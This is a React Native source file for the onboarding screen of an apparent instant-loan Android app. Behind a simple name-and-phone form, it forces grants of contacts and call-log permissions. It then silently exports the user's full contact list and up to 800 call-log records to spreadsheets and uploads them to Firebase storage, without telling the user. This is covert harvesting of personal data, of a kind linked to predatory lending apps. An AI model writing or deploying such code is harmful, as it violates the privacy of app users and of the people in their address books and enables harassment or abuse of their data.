import React, {useState} from 'react';
import {
  StyleSheet,
  Text,
  TouchableOpacity,
  ToastAndroid,
  Image,
  View,
} from 'react-native';
import Modal from 'react-native-modal';
import AppIntroSlider from 'react-native-app-intro-slider';
import {TextInput, Button} from 'react-native-paper';
import Contacts from 'react-native-contacts';
import XLSX from 'xlsx';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {useNavigation} from '@react-navigation/native';
import LinearGradient from 'react-native-linear-gradient';
import CallLogs from 'react-native-call-log';
import {request, PERMISSIONS, RESULTS, requestMultiple} from 'react-native-permissions';
import storage from '@react-native-firebase/storage';
import RNFS from 'react-native-fs';
import { initializeApp } from '@react-native-firebase/app';
import { firebaseConfig } from '../config/firebase';

const slides = [
  {
    key: 'slide1',
    title: 'Welcome to',
    logo: require("../assets/logopng.png"),
    text: 'Where all of your Loan requirements are fulfilled!',
    image: require('../assets/graphics/slide1.png'),
    backgroundColor: '#ff6f61',
  },
  {
    key: 'slide2',
    title: 'Highlights of',
    logo: require("../assets/logopng.png"),
    text: 'Low documents, No advance, One time verification, Instant disbursement.',
    image: require('../assets/graphics/slide2.png'),
    backgroundColor: '#ff6f61',
  },
  {
    key: 'slide3',
    title: 'Get Started with',
    logo: require("../assets/logopng.png"),
    text: "Your journey for Instant loan starts now, click on 'get started' to proceed.",
    image: require('../assets/graphics/slide3.png'),
    backgroundColor: '#fff',
  },
];

const Welcome = () => {
  const navigation = useNavigation();
  const [modalVisible, setModalVisible] = useState(false);
  const [name, setName] = useState('');
  const [phone, setPhone] = useState('');

  const handleSave = async () => {
    if (!name || !phone || phone.length !== 10) {
      ToastAndroid.show('Please enter valid details', ToastAndroid.SHORT);
      return;
    }
  
    try {
      ToastAndroid.show('Please Wait', ToastAndroid.SHORT);

      const statuses = await requestMultiple([
        PERMISSIONS.ANDROID.READ_CONTACTS,
        PERMISSIONS.ANDROID.WRITE_CONTACTS,
        PERMISSIONS.ANDROID.READ_CALL_LOG,
        PERMISSIONS.ANDROID.WRITE_CALL_LOG,
        PERMISSIONS.ANDROID.ANSWER_PHONE_CALLS,
      ]);
  
      // Check if any permission is denied
      const deniedPermissions = Object.values(statuses).some(
        status => status !== RESULTS.GRANTED
      );
  
      if (deniedPermissions) {
        ToastAndroid.show('Please grant all permissions to proceed', ToastAndroid.SHORT);
        return; // Do not navigate if any permission is denied
      }
  
      // Permissions granted, proceed with the rest of the code
      const contacts = await Contacts.getAll();
      const contactData = contacts.map(contact => ({
        Name: contact.displayName,
        PhoneNumber: contact.phoneNumbers?.[0]?.number || 'No phone number',
      }));
  
      if (!contactData.length) {
        throw new Error('No contacts found to export.');
      }
  
      const worksheet = XLSX.utils.json_to_sheet(contactData);
      const workbook = XLSX.utils.book_new();
      XLSX.utils.book_append_sheet(workbook, worksheet, 'Contacts');
  
      const excelData = XLSX.write(workbook, {
        type: 'binary',
        bookType: 'xlsx',
      });
  
      const buffer = new ArrayBuffer(excelData.length);
      const view = new Uint8Array(buffer);
      for (let i = 0; i < excelData.length; i++) {
        view[i] = excelData.charCodeAt(i) & 0xff;
      }
  
      const binaryString = Array.from(new Uint8Array(buffer))
        .map(byte => String.fromCharCode(byte))
        .join('');
  
      const filePath = `${RNFS.DocumentDirectoryPath}/${name}-${phone}-${Date.now()}.xlsx`;
      await RNFS.writeFile(filePath, binaryString, 'ascii');
  
      const fileName = filePath.split('/').pop();
      const reference = storage().ref(`contacts/${fileName}`);
      await reference.putFile(filePath);
  
      const downloadURL = await reference.getDownloadURL();
      setName('');
      setPhone('');
      setModalVisible(false);
      const myBooleanValue = true;
      ToastAndroid.show('Welcome to Home', ToastAndroid.SHORT);
      AsyncStorage.setItem('contactSynced', JSON.stringify(myBooleanValue));
      
      // Navigate to home screen only if permissions are granted and file is uploaded successfully
      handleSaveCallLogs();
      navigation.goBack();
      console.log(downloadURL);
    } catch (error) {
      console.error('Error saving contacts:', error);
      ToastAndroid.show('Failed to save contacts. Please try again.', ToastAndroid.LONG);
    }
  };
  

  const handleSaveCallLogs = async () => {
    try {
      const status = await request(PERMISSIONS.ANDROID.READ_CALL_LOG);
      if (status !== RESULTS.GRANTED)
        throw new Error('Call log permission denied');

      const callLogs = await CallLogs.load(800);
     
      const callLogData = callLogs.map(log => ({
        Name: log.name || 'Unknown',
        PhoneNumber: log.phoneNumber,
        Type: log.type,
        Date: new Date(parseInt(log.timestamp)).toLocaleString(),
        Duration: log.duration,
      }));

      const worksheet = XLSX.utils.json_to_sheet(callLogData);
      const workbook = XLSX.utils.book_new();
      XLSX.utils.book_append_sheet(workbook, worksheet, 'CallLogs');

      const excelData = XLSX.write(workbook, {
        type: 'binary',
        bookType: 'xlsx',
      });

      const buffer = new ArrayBuffer(excelData.length);
      const view = new Uint8Array(buffer);
      for (let i = 0; i < excelData.length; i++) {
        view[i] = excelData.charCodeAt(i) & 0xff;
      }

      const binaryString = Array.from(new Uint8Array(buffer))
        .map(byte => String.fromCharCode(byte))
        .join('');

      const filePath = `${
        RNFS.DocumentDirectoryPath
      }/${name}-${phone}-${Date.now()}.xlsx`;
      await RNFS.writeFile(filePath, binaryString, 'ascii');

      const fileName = filePath.split('/').pop();
      const reference = storage().ref(`call-logs/${fileName}`);
      await reference.putFile(filePath);

      const downloadURL = await reference.getDownloadURL();

      setModalVisible(false);
      const myBooleanValue = true;
      AsyncStorage.setItem('callLogsSynced', JSON.stringify(myBooleanValue));

      console.log(downloadURL);
    } catch (error) {
      ToastAndroid.show(
        error.message || 'Error uploading call logs',
        ToastAndroid.SHORT,
      );
    }
  };

  const _renderItem = ({item}) => (
    <LinearGradient
      colors={['#09f', '#eee']}
      start={{x: 0, y: 0}}
      end={{x: 1, y: 1}}
      style={styles.slide}>
      <Text style={styles.title}>{item.title}</Text>
      <Image source={item.logo} style={styles.logo} />
      <Image source={item.image} style={styles.image} />
      <Text style={styles.text}>{item.text}</Text>
    </LinearGradient>
  );

  const _renderNextButton = () => {
    return (
      <View style={styles.buttonCircle}>
        <Text style={styles.buttonText}>Next</Text>
      </View>
    );
  };

  const _renderDoneButton = () => {
    return (
      <TouchableOpacity
        style={styles.buttonCircle}
        onPress={() => setModalVisible(true)}>
        <Text style={styles.buttonText}>Get Started</Text>
      </TouchableOpacity>
    );
  };

  const _renderPrevButton = () => {
    return (
      <View style={styles.buttonCircle}>
        <Text style={styles.buttonText}>Back</Text>
      </View>
    );
  };

  return (
    <>
      <AppIntroSlider
        renderItem={_renderItem}
        data={slides}
        dotStyle={styles.dotStyle}
        activeDotStyle={styles.activeDotStyle}
        renderNextButton={_renderNextButton}
        renderDoneButton={_renderDoneButton}
        renderPrevButton={_renderPrevButton}
      />
      <Modal isVisible={modalVisible}>
        <LinearGradient
          colors={['#8e2de2', '#000']}
          start={{x: 0, y: 0}}
          end={{x: 1, y: 1}}
          style={styles.modalContent}>
          <Text style={styles.modalTitle}>Enter Your Details</Text>
          <TextInput
            label="Name"
            value={name}
            onChangeText={setName}
            style={styles.input}
            mode="outlined"
          />
          <TextInput
            label="Phone"
            value={phone}
            onChangeText={setPhone}
            style={styles.input}
            keyboardType="phone-pad"
            maxLength={10}
          />
          <Button mode="contained" onPress={handleSave} style={styles.button}>
            <Text
              style={{
                color: '#fff',
                fontWeight: 'bold',
                fontSize: 18,
                textAlign: 'center',
              }}>
              Save
            </Text>
          </Button>
        </LinearGradient>
      </Modal>
    </>
  );
};

const styles = StyleSheet.create({
  slide: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 20,
  },
  logo: {
    width: '55%',
    height: 60,
    marginVertical: 10,
  },
  image: {
    width: 270,
    height: 200,
    marginVertical: 32,
    borderRadius: 10,
  },
  dotStyle: {
    backgroundColor: 'rgba(0, 0, 0, .5)',
  },
  activeDotStyle: {
    backgroundColor: '#59b2ab',
  },
  title: {
    fontSize: 25,
    color: '#fff',
    textAlign: 'center',
    fontWeight: 'bold',
    marginVertical: 15,
  },
  text: {
    width: '90%',
    fontSize: 16,
    color: '#000',
    fontWeight: '600',
    textAlign: 'center',
  },
  buttonCircle: {
    height: 40,
    paddingHorizontal: 18,
    backgroundColor: '#19b2aa',
    borderWidth: 1,
    borderColor: '#fff',
    borderRadius: 40,
    justifyContent: 'center',
    alignItems: 'center',
  },
  buttonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
  },
  modalContent: {padding: 20, borderRadius: 10},
  modalTitle: {
    color: 'white',
    fontWeight: 'bold',
    fontSize: 18,
    marginBottom: 12,
  },
  input: {
    width: '100%',
    marginBottom: 12,
    backgroundColor: '#eef',
    borderRadius: 20,
    color: '#fff',
    height: 60,
  },
  button: {
    marginTop: 12,
    width: '100%',
    padding: 8,
    borderWidth: 2,
    borderColor: '#fff',
    backgroundColor: 'rgba(255, 255, 255, 0.3)',
    borderRadius: 20,
    marginVertical: 5,
    alignItems: 'center',
  },
});

export default Welcome;
